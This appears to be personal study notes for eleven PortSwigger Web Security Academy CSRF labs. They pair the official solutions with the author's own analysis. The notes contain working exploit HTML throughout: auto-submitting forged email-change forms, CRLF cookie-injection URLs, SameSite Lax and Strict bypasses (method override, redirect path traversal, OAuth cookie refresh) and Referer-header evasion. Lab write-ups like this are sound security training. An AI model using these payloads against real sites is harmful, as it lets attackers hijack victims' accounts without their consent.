[CSRF](https://www.hackingarticles.in/understanding-the-csrf-vulnerability-a-beginners-guide/)https://book.hacktricks.xyz/pentesting-web/csrf-cross-site-request-forgery

## **1. CSRF vulnerability with no defenses**
This lab's email change functionality is vulnerable to CSRF.
1. Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.
2. If you're using [Burp Suite Professional](https://portswigger.net/burp/pro), right-click on the request and select Engagement tools / Generate CSRF PoC. Enable the option to include an auto-submit script and click "Regenerate".
    Alternatively, if you're using [Burp Suite Community Edition](https://portswigger.net/burp/communitydownload), use the following HTML template. You can get the request URL by right-clicking and selecting "Copy URL".
    `<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> <input type="hidden" name="email" value="anything%40web-security-academy.net"> </form> <script> document.forms[0].submit(); </script>`
    
3. Go to the exploit server, paste your exploit HTML into the "Body" section, and click "Store".
4. To verify that the exploit works, try it on yourself by clicking "View exploit" and then check the resulting HTTP request and response.
5. Change the email address in your exploit so that it doesn't match your own.
6. Click "Deliver to victim" to solve the lab.

Vulnerable parameter - email change functionality
Goal - exploit the CSRF vulnerability and change the email address
creds - wiener:peter

In order for a CSRF attack to be possible:
- A relevant action - email change functionality
- Cookie based session handling - session cookie
- No unpredictable request parameters - **satisfied** (****no csrf token is present)**

![[Pasted image 20240920205439.png]]

- HTML payload (form action= "https://HOST/POST")
```
<html>
    <body>
        <h1>Hello World!</h1>
        <iframe style="display:none" name="csrf-iframe"></iframe>
        <form action="https://target-acb91feb1e053ea78076271500a20022.web-security-academy.net/my-account/change-email" method="POST" target="csrf-iframe" id="csrf-form">
            <input type="hidden" name="email" value="test5@test.ca">
        </form>

        <script>document.getElementById("csrf-form").submit()</script>
    </body>
</html>
```

- Delivering trough a python server (https://localserver:8000/path/to/file)
```
python3 -m http.server <port-number>
```

- Accessing the above link will redirect the target to the 'desired' website meanwhile the reset email will be changed per our html script(payload)

## **2. CSRF where token validation depends on request method**
This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests. 
1. Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.
2. Send the request to Burp Repeater and observe that if you change the value of the `csrf` parameter then the request is rejected.
3. Use "Change request method" on the context menu to convert it into a GET request and observe that the CSRF token is no longer verified.
4. If you're using [Burp Suite Professional](https://portswigger.net/burp/pro), right-click on the request, and from the context menu select Engagement tools / Generate CSRF PoC. Enable the option to include an auto-submit script and click "Regenerate".
    
    Alternatively, if you're using [Burp Suite Community Edition](https://portswigger.net/burp/communitydownload), use the following HTML template. You can get the request URL by right-clicking and selecting "Copy URL".
    
    `<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> <input type="hidden" name="email" value="anything%40web-security-academy.net"> </form> <script> document.forms[0].submit(); </script>`
5. Go to the exploit server, paste your exploit HTML into the "Body" section, and click "Store".
6. To verify if the exploit will work, try it on yourself by clicking "View exploit" and checking the resulting HTTP request and response.
7. Change the email address in your exploit so that it doesn't match your own.
8. Store the exploit, then click "Deliver to victim" to solve the lab.


Vulnerable parameter - email change functionality
Goal - exploit CSRF to change email address
Creds - wiener:peter

In order for a CSRF attack to be possible:
- A relevant action: change a users email
- Cookie-based session handling: session cookie
- No unpredictable request parameters: **Request method can be changed to GET which does not require CSRF token**

Testing CSRF Tokens:
1. Change the request method from POST to GET.

![[Pasted image 20240920210251.png]]
![[Pasted image 20240920210319.png]]
![[Pasted image 20240920210345.png]]
- now we can remove the CSRF token:
![[Pasted image 20240920210450.png]]

- HTML payload (form action="https://HOST/POST")
```
<html>
    <body>
        <h1>Hello World!</h1>
        <iframe style="display:none" name="csrf-iframe"></iframe>
        <form action="https://target-acee1f521e65f40d80e4b992006a0005.web-security-academy.net/my-account/change-email/" method="GET" target="csrf-iframe" id="csrf-form">
            <input type="hidden" name="email" value="test5@test.ca">
        </form>

        <script>document.getElementById("csrf-form").submit()</script>
    </body>
</html>
```

- Delivering trough a python server (https://localserver:8000/path/to/file)
```
python3 -m http.server <port-number>
```

- Accessing the above link will redirect the target to the 'desired' website meanwhile the reset email will be changed per our html script(payload)

## **3. CSRF where token validation depends on token being present**
This lab's email change functionality is vulnerable to CSRF. 

1. Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.
2. Send the request to Burp Repeater and observe that if you change the value of the `csrf` parameter then the request is rejected.
3. Delete the `csrf` parameter entirely and observe that the request is now accepted.
4. If you're using [Burp Suite Professional](https://portswigger.net/burp/pro), right-click on the request, and from the context menu select Engagement tools / Generate CSRF PoC. Enable the option to include an auto-submit script and click "Regenerate".
    Alternatively, if you're using [Burp Suite Community Edition](https://portswigger.net/burp/communitydownload), use the following HTML template. You can get the request URL by right-clicking and selecting "Copy URL"
    `<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> <input type="hidden" name="$param1name" value="$param1value"> </form> <script> document.forms[0].submit(); </script>`
5. Go to the exploit server, paste your exploit HTML into the "Body" section, and click "Store".
6. To verify if the exploit will work, try it on yourself by clicking "View exploit" and checking the resulting HTTP request and response.
7. Change the email address in your exploit so that it doesn't match your own.
8. Store the exploit, then click "Deliver to victim" to solve the lab.


Vulnerable parameter - email change functionality
Goal - exploit CSRF to change email address
Creds - wiener:peter

In order for a CSRF attack to be possible:
- A relevant action: change a users email
- Cookie-based session handling: session cookie
- No unpredictable request parameters: csrf token **is not mandatory**

Testing CSRF Tokens:
1. Change the request method from POST to GET.
2.  Remove the CSRF token and see if application accepts request.

- removing csrf token and forwards the post request we observe that application accept the request so we can proceed further with the exploit which is a basic one (as first example - no defense due to lack of csrf token)

![[Pasted image 20240921183028.png]]
![[Pasted image 20240921183005.png]]

- HTML payload (form action="https://HOST/POST")
```
<html>
    <body>
        <h1>Hello World!</h1>
        <iframe style="display:none" name="csrf-iframe"></iframe>
        <form action="https://target-acc61fc61e3d7e1e800e3f9d001500fa.web-security-academy.net/my-account/change-email" method="POST" id="csrf-form" target="csrf-iframe">
        <input type="hidden" name="email" value="test5@test.ca">
        </form>

        <script>document.getElementById("csrf-form").submit()</script>
    </body>
</html>
```

- Delivering trough a python server (https://localserver:8000/path/to/file)
```
python3 -m http.server <port-number>
```

## **4. CSRF where token is not tied to user session**
This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system.
1. Open Burp's browser and log in to your account. Submit the "Update email" form, and intercept the resulting request.
2. Make a note of the value of the CSRF token, then drop the request.
3. Open a private/incognito browser window, log in to your other account, and send the update email request into Burp Repeater.
4. Observe that if you swap the CSRF token with the value from the other account, then the request is accepted.
5. Create and host a proof of concept exploit as described in the solution to the [CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses) lab. Note that the CSRF tokens are single-use, so you'll need to include a fresh one.
6. Change the email address in your exploit so that it doesn't match your own.
7. Store the exploit, then click "Deliver to victim" to solve the lab.

Vulnerable parameter - email change functionality
Goal - exploit CSRF to change email address
Credentials - wiener:peter, carlos:montoya

In order for a CSRF attack to be possible:
- A relevant action: change a users email
- Cookie-based session handling: session cookie
- No unpredictable request parameters: csrf token is not tied to user session

Testing CSRF Tokens:
1. Remove the CSRF token and see if application accepts request
2. Change the request method from POST to GET
3. See if CSRF token is tied to user session (try with incognito mode)

- try to change csrf token in order to see if it is accepted or not(if it is checked in the backend)
	if is not -> check if csrf token is tied to the user's session cookie:
		- use csrf token from another account using incognito mode :)
			if is accepted --> the csrf token is not tied to the user's session 

- HTML payload:
```
<html>
    <body>
        <h1>Hello World!</h1>
        <iframe style="display:none" name="csrf-iframe"></iframe>
        <form action="https://target-ac941f081e38bc8480279ef400d5002f.web-security-academy.net/my-account/change-email" method="post" id="csrf-form" target="csrf-iframe">
            <input type="hidden" name="email" value="test5@test.ca">
            <input type="hidden" name="csrf" value="zXqP4oMlBXDX16q4Qb5MgFawPZXaK4bW">
        </form>

        <script>document.getElementById("csrf-form").submit()</script>

    </body>
</html>
```

- Delivering trough a python server (https://localserver:8000/path/to/file)
```
python3 -m http.server <port-number>
```

# 5. CSRF where token is tied to non-session cookie
  
This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.
1. Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.
2. Send the request to Burp Repeater and observe that changing the `session` cookie logs you out, but changing the `csrfKey` cookie merely results in the CSRF token being rejected. This suggests that the `csrfKey` cookie may not be strictly tied to the session.
3. Open a private/incognito browser window, log in to your other account, and send a fresh update email request into Burp Repeater.
4. Observe that if you swap the `csrfKey` cookie and `csrf` parameter from the first account to the second account, the request is accepted.
5. Close the Repeater tab and incognito browser.
6. Back in the original browser, perform a search, send the resulting request to Burp Repeater, and observe that the search term gets reflected in the Set-Cookie header. Since the search function has no CSRF protection, you can use this to inject cookies into the victim user's browser.
7. Create a URL that uses this vulnerability to inject your `csrfKey` cookie into the victim's browser:
    `/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None`
8. Create and host a proof of concept exploit as described in the solution to the [CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses) lab, ensuring that you include your CSRF token. The exploit should be created from the email change request.
9. Remove the auto-submit `<script>` block, and instead add the following code to inject the cookie:
    `<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">`
10. Change the email address in your exploit so that it doesn't match your own.
11. Store the exploit, then click "Deliver to victim" to solve the lab.

Vulnerable parameter - email change functionality
Goal - exploit CSRF to change email address
Creds - wiener:peter, carlos:montoya

In order for a CSRF attack to be possible:
- A relevant action: change a users email
- Cookie-based session handling: session cookie
- No unpredictable request parameters 

Testing CSRF Tokens:
1. Remove the CSRF token and see if application accepts request
2. Change the request method from POST to GET
3. See if csrf token is tied to user session

Testing CSRF Tokens and CSRF cookies:
1. Check if the CSRF token is tied to the CSRF cookie
   - Submit an invalid CSRF token
   - Submit a valid CSRF token from another user
2. Submit valid CSRF token AND cookie from another user

csrf token: SXsROOTp3jzq6M5UzIL2KkJIqGpffIQb
csrf cookie: ho7GGxMe4EZSrQ8xZ0sBDq2yW0ey9bKH

In order to exploit this vulnerability, we need to perform 2 things:
1. Inject a csrf cookie in the user's session (HTTP Header injection) - satisfied
2. Send a CSRF attack to the victim with a known csrf token


- after taking a valid csrf token and cookie from another user we have to inject the csrf cookie into header (we will use search functionality in order to see if a search cookie parameter is generated and we will inject over there)
	![[Pasted image 20240922003407.png]]

![[Pasted image 20240922003858.png]]

![[Pasted image 20240922010507.png]]

- HTML payload (form action= https://HOST/POST (change email request - first tab) | 
               img src= https://HOST/POST(injected header - second tab) )
```html
<html>
    <body>
        <h1>Hello World!</h1>
        <form action="https:///0a33009903154da184367954005e0013.web-security-academy.net/my-account/change-email" method="post" id="csrf-form">
            <input type="hidden" name="email" value="test5@test.ca">
            <input type="hidden" name="csrf" value="UYjqwyyGyrsnr8qGu5adRFltwGbIS8S6">
        </form>

        <img src="https://0a33009903154da184367954005e0013.web-security-academy.net/?search=hat%0d%0aSet-Cookie:%20csrfKey=04WkQgPVzQFtURvOaoJEwc04UjhQb5Gb%3b%20SameSite=None" onerror="document.forms[0].submit()">
    </body>
```

- Delivering trough a python server (https://localserver:8000/path/to/file)
```
python3 -m http.server <port-number>
```

# 6. CSRF where token is duplicated in cookie

This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.
1. Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.
2. Send the request to Burp Repeater and observe that the value of the `csrf` body parameter is simply being validated by comparing it with the `csrf` cookie.
3. Perform a search, send the resulting request to Burp Repeater, and observe that the search term gets reflected in the Set-Cookie header. Since the search function has no CSRF protection, you can use this to inject cookies into the victim user's browser.
4. Create a URL that uses this vulnerability to inject a fake `csrf` cookie into the victim's browser:
    `/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None`
5. Create and host a proof of concept exploit as described in the solution to the [CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses) lab, ensuring that your CSRF token is set to "fake". The exploit should be created from the email change request.
6. Remove the auto-submit `<script>` block and instead add the following code to inject the cookie and submit the form:
    `<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>`
7. Change the email address in your exploit so that it doesn't match your own.

Vulnerable parameter - email change functionality
Goal - exploit CSRF to change email address
Creds - wiener:peter

In order for a CSRF attack to be possible:
- A relevant action: change a users email
- Cookie-based session handling: session cookie
- No unpredictable request parameters 

Testing CSRF Tokens:
1. Remove the CSRF token and see if application accepts request
2. Change the request method from POST to GET
3. See if csrf token is tied to user session

Testing CSRF Tokens and CSRF cookies:
1. Check if the CSRF token is tied to the CSRF cookie
   - Submit an invalid CSRF token
   - Submit a valid CSRF token from another user
2. Submit valid CSRF token and cookie from another user

In order to exploit this vulnerability, we need to perform 2 things:
1. Inject a csrf cookie in the user's session (HTTP Header injection) - satisfied
2. Send a CSRF attack to the victim with a known csrf token

- as it can be seen, it doesn't matter the value of the cookie as soon as are equal
![[Pasted image 20240922012718.png]]
![[Pasted image 20240922012739.png]]

- we will inject to cookie header trough the search set cookie, value which will be equal to the csrf token (first tab)
![[Pasted image 20240922013015.png]]

- HTML payload (form action= https://HOST/POST (change email request - first tab) | 
               img src= https://HOST/POST(injected header - second tab) )
```html
<html>
    <body>
        <h1>Hello World!</h1>
        <form action="https://0a25003904014c148065ad2c00ae00af.web-security-academy.net/my-account/change-email" method="post">
            <input type="hidden" name="email" value="test5@test.ca">
            <input type="hidden" name="csrf" value="hacked">
        </form>

        <img src="https://0a25003904014c148065ad2c00ae00af.web-security-academy.net/?search=hat%0d%0aSet-Cookie:%20csrf=hacked%3b%20SameSite=None" onerror="document.forms[0].submit()">
    </body>
</html>
```

- Delivering trough a python server (https://localserver:8000/path/to/file)
```
python3 -m http.server <port-number>
```

# **7. SameSite Lax bypass via method override**

##### Study the change email function
1. In Burp's browser, log in to your own account and change your email address.
2. In Burp, go to the **Proxy > HTTP history** tab.
3. Study the `POST /my-account/change-email` request and notice that this doesn't contain any unpredictable tokens, so may be vulnerable to CSRF if you can bypass the SameSite cookie restrictions.
4. Look at the response to your `POST /login` request. Notice that the website doesn't explicitly specify any SameSite restrictions when setting session cookies. As a result, the browser will use the default `Lax` restriction level.
5. Recognize that this means the session cookie will be sent in cross-site `GET` requests, as long as they involve a top-level navigation.

##### Bypass the SameSite restrictions
1. Send the `POST /my-account/change-email` request to Burp Repeater.
2. In Burp Repeater, right-click on the request and select **Change request method**. Burp automatically generates an equivalent `GET` request.
3. Send the request. Observe that the endpoint only allows `POST` requests.
4. Try overriding the method by adding the `_method` parameter to the query string:
    `GET /my-account/change-email?email=foo%40web-security-academy.net&_method=POST HTTP/1.1`
5. Send the request. Observe that this seems to have been accepted by the server.
6. In the browser, go to your account page and confirm that your email address has changed.

##### Craft an exploit
1. In the browser, go to the exploit server.
2. In the **Body** section, create an HTML/JavaScript payload that induces the viewer's browser to issue the malicious `GET` request. Remember that this must cause a top-level navigation in order for the session cookie to be included. The following is one possible approach:
    `<script> document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST"; </script>`
3. Store and view the exploit yourself. Confirm that this has successfully changed your email address on the target site.
4. Change the email address in your exploit so that it doesn't match your own & deliver the exploit to the victim.

- login page: observe that at response level secure & httponly are present but not SameSite restrictions
![[Pasted image 20240924115100.png]]

- moving to change email page --> send it to repeater --> change the POST in GET method (if is not allowed via burp we will add &method=POST at the end of the GET request in order to bypass the filter)
	![[Pasted image 20240924115441.png]]
	![[Pasted image 20240924115507.png]]
	
- HTML/Javascript payload (document.location="https://HOST/GET")
```html
<script>
    document.location = "https://0a1200a103990ed481024882008600cc.web-security-academy.net/my-account/change-email?email=test2%40test.ca&_method=POST";
</script>
```

# 8. SameSite Strict bypass via client-side redirect
##### Study the change email function
1. In Burp's browser, log in to your own account and change your email address.
2. In Burp, go to the **Proxy > HTTP history** tab.
3. Study the `POST /my-account/change-email` request and notice that this doesn't contain any unpredictable tokens, so may be vulnerable to CSRF if you can bypass any [SameSite](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions) cookie restrictions.
4. Look at the response to your `POST /login` request. Notice that the website explicitly specifies `SameSite=Strict` when setting session cookies. This prevents the browser from including these cookies in cross-site requests.

##### Identify a suitable gadget
1. In the browser, go to one of the blog posts and post an arbitrary comment. Observe that you're initially sent to a confirmation page at `/post/comment/confirmation?postId=x` but, after a few seconds, you're taken back to the blog post.
2. In Burp, go to the proxy history and notice that this redirect is handled client-side using the imported JavaScript file `/resources/js/commentConfirmationRedirect.js`.
3. Study the JavaScript and notice that this uses the `postId` query parameter to dynamically construct the path for the client-side redirect.
4. In the proxy history, right-click on the `GET /post/comment/confirmation?postId=x` request and select **Copy URL**.
5. In the browser, visit this URL, but change the `postId` parameter to an arbitrary string.
    `/post/comment/confirmation?postId=foo`
6. Observe that you initially see the post confirmation page before the client-side JavaScript attempts to redirect you to a path containing your injected string, for example, `/post/foo`.
7. Try injecting a [path traversal](https://portswigger.net/web-security/file-path-traversal) sequence so that the dynamically constructed redirect URL will point to your account page:
    `/post/comment/confirmation?postId=1/../../my-account`
8. Observe that the browser normalizes this URL and successfully takes you to your account page. This confirms that you can use the `postId` parameter to elicit a `GET` request for an arbitrary endpoint on the target site.

##### Bypass the SameSite restrictions
1. In the browser, go to the exploit server and create a script that induces the viewer's browser to send the `GET` request you just tested. The following is one possible approach:
    `<script> document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=../my-account"; </script>`
2. Observe that when the client-side redirect takes place, you still end up on your logged-in account page. This confirms that the browser included your authenticated session cookie in the second request, even though the initial comment-submission request was initiated from an arbitrary external site.

##### Craft an exploit
1. Send the `POST /my-account/change-email` request to Burp Repeater.
2. In Burp Repeater, right-click on the request and select **Change request method**. Burp automatically generates an equivalent `GET` request.
3. Send the request. Observe that the endpoint allows you to change your email address using a `GET` request.
4. Go back to the exploit server and change the `postId` parameter in your exploit so that the redirect causes the browser to send the equivalent `GET` request for changing your email address:
    `<script> document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1"; </script>`
    Note that you need to include the `submit` parameter and URL encode the ampersand delimiter to avoid breaking out of the `postId` parameter in the initial setup request.
5. Test the exploit on yourself and confirm that you have successfully changed your email address.
6. Change the email address in your exploit so that it doesn't match your own.

 Analysis:
- we observe that in the post request of login page we have set SameSite strict attribute
	![[Pasted image 20240925011636.png]]
	
- we observe that in the post request of the change email functionality we can change the request from POST to GET(which it means that this endpoint accepts also get request)
	![[Pasted image 20240925011800.png]]
- we have to bypass the SameSite strict by finding a redirecting element which method is trough GET (we will find a redirect in the comment section and the element is postID )
	![[Pasted image 20240925012029.png]]
	![[Pasted image 20240925011914.png]]![[Pasted image 20240925012201.png]]

- payload0 (vulnerable redirecting element):
```
/post/comment/confirmation?postId=5
```

- payload1 (redirecting to my account in order to change email):
```
/post/comment/confirmation?postId=my-account/
```

- payload2 (page not found so we have to do a path traversal):
```
/post/comment/confirmation?postId=../my-account/
```

- payload3 (append the change email request):
```
post/comment/confirmation?postId=../my-account/change-email?email=paein%40web-security-academy.net&submit=1"
```

`/change-email?email=paein%40web-security-academy.net&submit=1"` is taken from the POST change email request page

- payload4 (URL encode the value of the '&' which is %26):
```
post/comment/confirmation?postId=../my-account/change-email?email=paein%40web-security-academy.net%26submit=1" 
```

- final script payload (append the host https://HOST/POST)
```
<script>
document.location=https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=paein%40web-security-academy.net%26submit=1" 
</script>
```

# 9. SameSite Lax bypass via cookie refresh
##### Study the change email function
1. In Burp's browser, log in via your social media account and change your email address.
2. In Burp, go to the **Proxy > HTTP history** tab.
3. Study the `POST /my-account/change-email` request and notice that this doesn't contain any unpredictable tokens, so may be vulnerable to CSRF if you can bypass any SameSite cookie restrictions.
4. Look at the response to the `GET /oauth-callback?code=[...]` request at the end of the [OAuth](https://portswigger.net/web-security/oauth) flow. Notice that the website doesn't explicitly specify any SameSite restrictions when setting session cookies. As a result, the browser will use the default `Lax` restriction level.

##### Attempt a CSRF attack
1. In the browser, go to the exploit server.
2. Use the following template to create a basic CSRF attack for changing the victim's email address:
```html
<script>
    history.pushState('', '', '/')
</script>

<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="foo@bar.com" />
    <input type="submit" value="Submit request" />
</form>

<script>
    document.forms[0].submit();
</script>
```

3. Store and view the exploit yourself. What happens next depends on how much time has elapsed since you logged in:
    - If it has been longer than two minutes, you will be logged in via the OAuth flow, and the attack will fail. In this case, repeat this step immediately.
    - If you logged in less than two minutes ago, the attack is successful and your email address is changed. From the **Proxy > HTTP history** tab, find the `POST /my-account/change-email` request and confirm that your session cookie was included even though this is a cross-site `POST` request.

##### Bypass the SameSite restrictions
1. In the browser, notice that if you visit `/social-login`, this automatically initiates the full OAuth flow. If you still have a logged-in session with the OAuth server, this all happens without any interaction.
2. From the proxy history, notice that every time you complete the OAuth flow, the target site sets a new session cookie even if you were already logged in.
3. Go back to the exploit server.
4. Change the JavaScript so that the attack first refreshes the victim's session by forcing their browser to visit `/social-login`, then submits the email change request after a short pause. The following is one possible approach:
```
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@web-security-academy.net">
</form>

 <script>
     window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
     setTimeout(changeEmail, 5000);
     function changeEmail(){
        document.forms[0].submit();
        }
 </script>`
```

Note that we've opened the `/social-login` in a new window to avoid navigating away from the exploit before the change email request is sent.
    
5. Store and view the exploit yourself. Observe that the initial request gets blocked by the browser's popup blocker.  
6. Observe that, after a pause, the CSRF attack is still launched. However, this is only successful if it has been less than two minutes since your cookie was set. If not, the attack fails because the popup blocker prevents the forced cookie refresh.


##### Bypass the popup blocker
1. Realize that the popup is being blocked because you haven't manually interacted with the page.
2. Tweak the exploit so that it induces the victim to click on the page and only opens the popup once the user has clicked. The following is one possible approach:
```
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@portswigger.net">
</form>

    <p>Click anywhere on the page</p>

<script>
     window.onclick = () => { window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
    setTimeout(changeEmail, 5000); }
     function changeEmail() {
     document.forms[0].submit(); 
     }
 </script>
```
3. Test the attack on yourself again while monitoring the proxy history in Burp.
4. When prompted, click the page. This triggers the OAuth flow and issues you a new session cookie. After 5 seconds, notice that the CSRF attack is sent and the `POST /my-account/change-email` request includes your new session cookie.
5. Go to your account page and confirm that your email address has changed.
6. Change the email address in your exploit so that it doesn't match your own.
7. Deliver the exploit to the victim to solve the lab.

Analysis:
![[Pasted image 20240925152141.png]]

# **10. CSRF where Referer validation depends on header being present**
This lab's email change functionality is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback.

1. Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.
2. Send the request to Burp Repeater and observe that if you change the domain in the Referer HTTP header then the request is rejected.
3. Delete the Referer header entirely and observe that the request is now accepted.
4. Create and host a proof of concept exploit as described in the solution to the [CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses) lab. Include the following HTML to suppress the Referer header:
    `<meta name="referrer" content="no-referrer">`
    
5. Change the email address in your exploit so that it doesn't match your own.
6. Store the exploit, then click "Deliver to victim" to solve the lab.


In order for a CSRF attack to be possible:
- A relevant action: change a users email
- Cookie-based session handling: session cookie
- No unpredictable request parameters: no csrf token

Testing Referer header for CSRF attacks:
1. Remove the Referer header

- we generate and deliver the basic CSRF payload and we see that the website responds with "Invalid referer header" (it makes sure that the request is coming from the same domain as the website - if it is coming from anywhere else the request is rejected)
![[Pasted image 20240925152932.png]]
	![[Pasted image 20240925153036.png]]

- we can see that our referer is http://burpsuite/ that is completely different from our domain
![[Pasted image 20240925153207.png]]

- we can spoof the referer header or to remove it and if the request is accepted without it we are ready to go; 

- Payload:
```
<html>
    <head>
        <meta name="referrer" content="never">        REMOVING THE REFERRER HEADER
    </head>

    <!--NOTE: Since the Web Security Academy intoduced a defense in that does not allow iframes from different origins, the iframe needs to be removed.-->
    <body>
        <h1>Hello world!</h1>
        <form action="https://0ab5007803da07dc80ad356300f6002f.web-security-academy.net/my-account/change-email" method = "post" id="csrf-form">
            <input type="hidden" name="email" value="test6@test.ca">
        </form>

        <script>document.getElementById("csrf-form").submit()</script>
    </body>
</html>
```

# **11. CSRF with broken Referer validation**
This lab's email change functionality is vulnerable to CSRF. It attempts to detect and block cross domain requests, but the detection mechanism can be bypassed.

1. Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.
2. Send the request to Burp Repeater. Observe that if you change the domain in the Referer HTTP header, the request is rejected.
3. Copy the original domain of your lab instance and append it to the Referer header in the form of a query string. The result should look something like this:
    `Referer: https://arbitrary-incorrect-domain.net?YOUR-LAB-ID.web-security-academy.net`
4. Send the request and observe that it is now accepted. The website seems to accept any Referer header as long as it contains the expected domain somewhere in the string.
5. Create a CSRF proof of concept exploit as described in the solution to the [CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses) lab and host it on the exploit server. Edit the JavaScript so that the third argument of the `history.pushState()` function includes a query string with your lab instance URL as follows:
    `history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net")`
    
    This will cause the Referer header in the generated request to contain the URL of the target site in the query string, just like we tested earlier.
    
6. If you store the exploit and test it by clicking "View exploit", you may encounter the "invalid Referer header" error again. This is because many browsers now strip the query string from the Referer header by default as a security measure. To override this behavior and ensure that the full URL is included in the request, go back to the exploit server and add the following header to the "Head" section:
    `Referrer-Policy: unsafe-url`


In order for a CSRF attack to be possible:
- A relevant action: change a users email
- Cookie-based session handling: session cookie
- No unpredictable request parameters (satisfied b/c no csrf token)

Testing Referer header for CSRF attacks:
1. Remove the Referer header
2. Check which portion of the referrer header is the application validating


- host != referer when we send the PoC generated exploit
	![[Pasted image 20240925184921.png]]
	![[Pasted image 20240925184942.png]]
	![[Pasted image 20240925184345.png]]

- removing the referer and send the request again in order to see if it is accepted (is not)_
	![[Pasted image 20240925185052.png]]

- checking which portion of the referrer header is validated in the backend and we observe that if we are changing the first part the request is still accepted --> `LAB-ID.web-security-academy.net` is compared by the backend server
```
https://paein-example-domain.com/?LAB-ID.web-security-academy.net`
```

Note:
	`/?` - this represents a domain query parameter 
	![[Pasted image 20240925185342.png]]

- Payload(using the query parameter we append the valid part of the refferer to our url in order to match the original one by the backend):
```
<html>
    <body>
    
        <script>
	        history.pushState('','','/?0a9e0009033f679984f1dd4a00b70051.web-security-academy.net/my-account')
        </script>
        
        <h1>Hello World!</h1>
        
        <form action="https://0a9e0009033f679984f1dd4a00b70051.web-security-academy.net/my-account/change-email" method="post" id="csrf-form">
            <input type="hidden" name="email" value="test5@test.ca">
        </form>

        <script>
	        document.getElementById("csrf-form").submit()
	    </script>
	    
    </body>
</html>
```
